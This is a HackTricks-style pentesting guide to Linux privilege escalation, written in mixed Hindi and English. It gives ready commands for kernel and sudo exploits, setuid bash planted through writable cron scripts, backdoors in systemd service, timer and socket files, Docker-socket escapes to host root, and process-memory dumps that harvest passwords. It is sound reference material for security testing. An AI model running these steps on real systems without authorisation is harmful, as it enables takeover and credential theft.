# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

चल रहे OS के बारे में जानकारी एकत्र करना शुरू करते हैं।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **`PATH` वेरिएबल के किसी भी फ़ोल्डर पर लिखने की अनुमति रखते हैं** तो आप कुछ libraries या binaries hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

कर्नेल संस्करण की जाँच करें और देखें कि क्या कोई ऐसा exploit है जिसका उपयोग करके आप escalate privileges कर सकें
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहां एक अच्छी vulnerable kernel सूची और कुछ पहले से **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप निम्न कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
नीचे दिए गए Tools kernel exploits खोजने में मदद कर सकते हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

हमेशा **Google में kernel version खोजें**, शायद आपका kernel version किसी kernel exploit में लिखा हुआ है और फिर आप सुनिश्चित हो जाएँगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर sudo संस्करणों के आधार पर जो निम्न में दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo संस्करण vulnerable है।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

द्वारा @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

देखें **smasher2 box of HTB** — यह इस vuln को कैसे exploit किया जा सकता है का एक **उदाहरण** है
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपायों की सूची बनाएं

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप docker container के अंदर हैं तो आप इससे escape करने की कोशिश कर सकते हैं:


{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँच करें **what is mounted and unmounted**, कहाँ और क्यों। अगर कुछ unmounted है तो आप उसे mount करके private info की जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी software

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, जाँच करें कि **any compiler is installed**. यह उपयोगी है अगर आपको कोई kernel exploit इस्तेमाल करना हो, क्योंकि अनुशंसा होती है कि आप इसे उस मशीन पर compile करें जहाँ आप इसका इस्तेमाल करने वाले हैं (या किसी समान मशीन में)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ़्टवेयर स्थापित

स्थापित पैकेज और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे escalating privileges के लिए exploited किया जा सकता है…\
अनुशंसा की जाती है कि अधिक संदिग्ध स्थापित सॉफ़्टवेयर के संस्करण की मैन्युअल रूप से जाँच की जाए।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
अगर आपके पास मशीन तक SSH access है, तो आप मशीन में इंस्टॉल किए गए पुराने और कमजोर सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएँगे जो अधिकांशतः बेकार होगी, इसलिए OpenVAS या इसी तरह के किसी अनुप्रयोग की सलाह दी जाती है जो जाँच सके कि कोई इंस्टॉल किया गया सॉफ़्टवेयर संस्करण ज्ञात exploits के लिए vulnerable है_

## Processes

देखें कि **कौन से processes** चल रहे हैं और जाँचें कि कोई process **जरूरत से ज्यादा privileges** तो नहीं रखता (शायद tomcat root के द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा संभव [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) की जाँच करें। **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
साथ ही अपने processes की binaries पर अपने privileges भी चेक करें — हो सकता है आप किसी की बाइनरी को overwrite कर सकें।

### प्रोसेस मॉनिटरिंग

आप processes को monitor करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह उन vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है जो बार-बार execute होते हैं या जब कुछ requirements पूरी होती हैं।

### प्रोसेस मेमोरी

कुछ server services memory के अंदर **credentials in clear text inside the memory** सेव कर देती हैं।\
सामान्यतः आपको उन processes की memory पढ़ने के लिए **root privileges** चाहिए जो दूसरे users के हैं; इसलिए यह आम तौर पर तब अधिक उपयोगी होता है जब आप पहले से root हों और और credentials खोजना चाहें।\
हालाँकि, ध्यान रखें कि **एक सामान्य user के तौर पर आप उन processes की memory पढ़ सकते हैं जिनके आप owner हैं**।

> [!WARNING]
> ध्यान दें कि आजकल ज्यादातर machines **default रूप से ptrace की अनुमति नहीं देतीं** जिसका मतलब है कि आप अपने unprivileged user के अन्य processes को dump नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की accessibility को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

यदि आपके पास किसी FTP service की memory तक access है (उदाहरण के लिए), तो आप Heap निकालकर इसके अंदर के credentials खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

For a given process ID, **maps show how memory is mapped within that process's** virtual address space; it also shows the **permissions of each mapped region**. The **mem** pseudo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी। kernel का वर्चुअल address space /dev/kmem का उपयोग करके एक्सेस किया जा सकता है.\  
सामान्यतः, `/dev/mem` केवल **root** और **kmem** group द्वारा पढ़ा जा सकता है.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump Windows के Sysinternals suite के classic ProcDump tool का Linux के लिए पुनर्कल्पना है। इसे प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

process memory को dump करने के लिए आप इनका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से root आवश्यकताओं को हटाकर अपने स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रही है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के अनुभाग देखें ताकि किसी process की memory को dump करने के विभिन्न तरीके मिल सकें) और memory के अंदर credentials खोजें:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) memory से और कुछ well known files से clear text credentials चुराएगा। इसे सही रूप से काम करने के लिए root privileges की आवश्यकता होती है।

| फीचर                                             | प्रोसेस का नाम         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

जाँच करें कि कोई भी scheduled/Cron job vulnerable है या नहीं। शायद आप उस script का फायदा उठा सकें जो root द्वारा execute होती है (wildcard vuln? root द्वारा उपयोग की जाने वाली फ़ाइलों को modify कर सकते हैं? symlinks का उपयोग? root द्वारा उपयोग की जाने वाली डायरेक्टरी में specific फ़ाइलें बना सकते हैं?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमतियाँ हैं_)

यदि इस crontab के भीतर root उपयोगकर्ता बिना PATH सेट किए कोई कमांड या स्क्रिप्ट चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तब, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron द्वारा एक script में wildcard के साथ उपयोग (Wildcard Injection)

यदि root द्वारा चलाया गया कोई script किसी command के अंदर “**\***” रखता है, तो आप इसे unexpected चीज़ें (जैसे privesc) करने के लिए exploit कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/\***_ **के पहले आता है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

अधिक wildcard exploitation tricks के लिए निम्नलिखित पृष्ठ पढ़ें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script को ओवरराइट करना और symlink

यदि आप **cron script को संशोधित कर सकते हैं** जो root द्वारा execute किया जाता है, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा चलाया गया script किसी ऐसे **directory where you have full access** का उपयोग करता है, तो उस folder को हटाकर और उसकी जगह किसी दूसरे स्थान पर एक **symlink folder to another one** बना कर जहाँ आपका नियंत्रित script serve करे, यह उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### बार-बार होने वाले cron jobs

आप processes की निगरानी कर सकते हैं ताकि उन processes को खोजा जा सके जो हर 1, 2 या 5 मिनट पर चलाए जा रहे हों। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

उदाहरण के लिए, **monitor every 0.1s during 1 minute**, **sort by less executed commands** और सबसे अधिक executed हुए commands को delete करने के लिए, आप निम्न कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप निम्न का भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर शुरू हुए process को मॉनिटर करेगा और सूचीबद्ध करेगा)।

### अदृश्य cron jobs

यह संभव है कि एक cronjob **टिप्पणी के बाद carriage return रखने** से बनाया जा सके (newline character के बिना), और cron job काम करेगा। उदाहरण (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फाइलें

जाँचें कि क्या आप किसी भी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं, तो आप **इसे संशोधित कर सकते हैं** ताकि यह **निष्पादित करे** आपकी **backdoor जब** सेवा **शुरू**, **रीस्टार्ट** या **रोक** की जाए (शायद आपको मशीन के reboot होने तक इंतज़ार करना पड़े). \  
उदाहरण के लिए अपनी backdoor को .service फ़ाइल के अंदर बनाएं **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि यदि आपके पास **write permissions over binaries being executed by services**, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब services पुनः निष्पादित हों तो backdoors निष्पादित हो जाएँ।

### systemd PATH - सापेक्ष पथ

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को निम्न के साथ देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पथ के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप संभवतः **escalate privileges** कर पाएंगे। आपको ऐसी फ़ाइलों में **relative paths being used on service configurations** खोजनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर एक **निष्पादन योग्य** बनाएं जिसका नाम उसी relative path binary के समान हो, और जब सेवा से vulnerable action (**Start**, **Stop**, **Reload**) करने को कहा जाएगा, आपका **backdoor** execute हो जाएगा (अनप्रिविलेज्ड उपयोगकर्ता आमतौर पर सेवाएँ start/stop नहीं कर सकते — पर जाँच करें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में और जानने के लिए `man systemd.service` देखें।**

## **Timers**

**Timers** systemd की unit फ़ाइलें हैं जिनके नाम `**.timer**` पर समाप्त होते हैं और जो `**.service**` फ़ाइलों या events को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built‑in सपोर्ट होता है और ये asynchronously चल सकते हैं।

आप सभी timers को सूचीबद्ध करने के लिए निम्न चला सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

अगर आप किसी टाइमर को संशोधित कर सकते हैं तो आप इसे systemd.unit की कुछ मौजूदा यूनिट्स (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> यह unit है जिसे इस timer के समाप्त होने पर activate किया जाता है। आर्ग्युमेंट एक unit name है, जिसकी suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान default रूप से उसी नाम की service को लेता है जैसे timer unit का नाम है, सिवाय suffix के। (ऊपर देखें.) सुझाया जाता है कि जो unit activate किया जाता है और timer unit का unit name, दोनों एक समान हों, केवल suffix अलग हो।

Therefore, to abuse this permission you would need to:

- किसी systemd unit (जैसे `.service`) को खोजें जो **executing a writable binary** हो
- किसी systemd unit को खोजें जो **executing a relative path** हो और आपके पास **writable privileges** उस **systemd PATH** पर हों (ताकि आप उस executable का impersonate कर सकें)

**Learn more about timers with `man systemd.timer`.**

### **टाइमर सक्षम करना**

टाइमर enable करने के लिए आपको root privileges चाहिए और निम्न command चलाना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## सॉकेट्स

Unix Domain Sockets (UDS) क्लाइंट-सर्वर मॉडल में एक ही या अलग मशीनों पर **प्रोसेस कम्युनिकेशन** सक्षम करते हैं। ये इंटर-कंप्यूटर संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**Learn more about sockets with `man systemd.socket`.** इस फ़ाइल के अंदर कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं लेकिन सारांश में यह **सूचित करने** के लिए होते हैं कि यह socket कहाँ सुनने वाला है (AF_UNIX socket फ़ाइल का पथ, सुनने के लिए IPv4/6 और/या पोर्ट नंबर, आदि)।
- `Accept`: boolean argument लेता है। अगर **true** है, तो हर इनकमिंग कनेक्शन के लिए **एक service instance spawn** होता है और केवल कनेक्शन socket को ही इसे पास किया जाता है। अगर **false** है, तो सभी listening sockets स्वयं **started service unit को पास** किए जाते हैं, और सभी कनेक्शनों के लिए केवल एक service unit spawn होता है। यह मान datagram sockets और FIFOs के लिए अनदेखा कर दिया जाता है जहाँ एकल service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को हैंडल करता है। **Defaults to false**। प्रदर्शन कारणों से, नए daemons को केवल `Accept=no` के अनुकूल लिखने की सलाह दी जाती है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के **बनने** और bind होने से पहले या बाद में क्रमशः **execute** किया जाता है। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के arguments।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के **बंद** और हटाए जाने से पहले या बाद में क्रमशः **execute** होते हैं।
- `Service`: इनकमिंग ट्रैफ़िक पर सक्रिय करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no वाले sockets के लिए अनुमति है। यह डिफ़ॉल्ट रूप से उसी नाम वाली service को चुनता है जो socket के समान नाम रखती है (suffix बदलकर)। अधिकांश मामलों में इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आप किसी **writable** `.socket` फ़ाइल को पाते हैं तो आप `[Socket]` सेक्शन की शुरुआत में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाए जाने से पहले execute हो जाएगा। इसलिए, **संभवतः आपको मशीन के reboot होने तक प्रतीक्षा करनी पड़ेगी।**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

यदि आप किसी **writable socket** की पहचान करते हैं (_यहाँ हम Unix Sockets की बात कर रहे हैं न कि config `.socket` फ़ाइलों की_), तो आप उस socket के साथ **communicate** कर सकते हैं और संभवतः किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फ़ाइलों की बात कर रहा हूँ जो unix sockets की तरह काम करती हैं_). आप इसे निम्न कमांड से जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद **exploit some vulnerability**।

### लिखने योग्य Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical फ़ाइल that should be secured. By default, it's writable by the `root` user and members of the `docker` group. इस socket पर write access होने से privilege escalation हो सकता है। यहाँ बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके यदि Docker CLI उपलब्ध न हो तो।

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको host के फाइल सिस्टम में root-लेवल एक्सेस के साथ एक container चलाने की अनुमति देते हैं।

#### **Docker API का सीधे उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को अभी भी Docker API और `curl` कमांड्स का उपयोग करके manipulate किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** एक ऐसा container बनाने का request भेजें जो host सिस्टम की root directory को mount करे।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नया बनाया गया container स्टार्ट करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** container से कनेक्शन स्थापित करने के लिए `socat` का उपयोग करें, जिससे उसमें कमांड execute कर सकें।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेट करने के बाद, आप container में सीधे कमांड चला सकते हैं और host के filesystem पर root-लेवल एक्सेस पा सकते हैं।

### Others

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

देखें **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आपको ऐसा लगता है कि आप **`ctr`** command का उपयोग कर सकते हैं तो निम्न पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आपको ऐसा लगता है कि आप **`runc`** command का उपयोग कर सकते हैं तो निम्न पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है जो applications को कुशलतापूर्वक इंटरैक्ट और डेटा साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया यह विभिन्न प्रकार के application communication के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

यह सिस्टम बहुमुखी है, सरल IPC सपोर्ट करता है जो processes के बीच डेटा एक्सचेंज को बढ़ाता है, और यह **enhanced UNIX domain sockets** जैसी कार्यक्षमता याद दिलाता है। इसके अलावा, यह events या signals के ब्रॉडकास्ट में मदद करता है, जिससे सिस्टम कॉम्पोनेन्ट्स के बीच seamless इंटीग्रेशन संभव होता है। उदाहरण के लिए, Bluetooth daemon से आने वाला एक signal किसी music player को mute करने के लिए प्रेरित कर सकता है, जिससे user experience बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system को सपोर्ट करता है, जो applications के बीच service requests और method invocations को सरल बनाता है, और पारंपरिक रूप से जटिल प्रक्रियाओं को streamline करता है।

D-Bus एक **allow/deny model** पर काम करता है, जो matching policy rules के cumulative प्रभाव के आधार पर message permissions (method calls, signal emissions, आदि) को manage करता है। ये policies bus के साथ इंटरैक्शन को specify करती हैं, और इन permissions के exploit होने पर privilege escalation हो सकता है।

एक उदाहरण नीति `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user को `fi.w1.wpa_supplicant1` से messages own, send और receive करने की permissions का विवरण देता है।

